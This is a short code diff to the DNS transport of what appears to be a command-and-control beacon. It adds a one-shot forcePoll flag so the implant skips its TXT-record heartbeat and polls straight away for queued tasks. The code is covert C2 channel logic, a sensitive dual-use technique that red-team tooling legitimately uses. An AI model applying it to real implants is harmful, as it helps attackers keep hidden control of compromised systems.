@@ -727,7 +727,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     // HB 数据格式: [ackOffset:4][hbNonce:4][ackTaskNonce:4] = 12 字节
     // 只有在没有下载缓冲区、没有待处理任务、且使用 TXT 模式时才发心跳
     // 如果 hasPendingTasks=TRUE，跳过心跳直接进入 GET 逻辑
-    if (!this->downBuf && !this->hasPendingTasks && this->qtype[0] == 'T') { // starts with 'T' -> TXT
+    // Recursion-stable mode: if forcePoll=TRUE, bypass heartbeat caching signal and go directly to GET.
+    if (!this->forcePoll && !this->downBuf && !this->hasPendingTasks && this->qtype[0] == 'T') { // starts with 'T' -> TXT
         CHAR qnameA[512];
         // APT: Include ack_offset, hbNonce (cache bust), and ackTaskNonce (to identify which task is being ACKed)
         ULONG hbNonce = GetTickCount() ^ (this->seq * 7919);
@@ -782,6 +783,13 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             this->lastQueryOk = FALSE;
             return;
         }
+    }
+
+    // Clear one-shot forcePoll flag now that we're about to do a GET attempt.
+    if (this->forcePoll) {
+        this->forcePoll = FALSE;
+        // Ensure we don't get stuck in a cached "no task" state.
+        // Do not reset downAckOffset here; ACK is handled via HB/PUT meta.
     }
 
     // 正常 GET (TXT)：从服务器获取包含 [total_len][offset][chunk] 头部的下行片段，
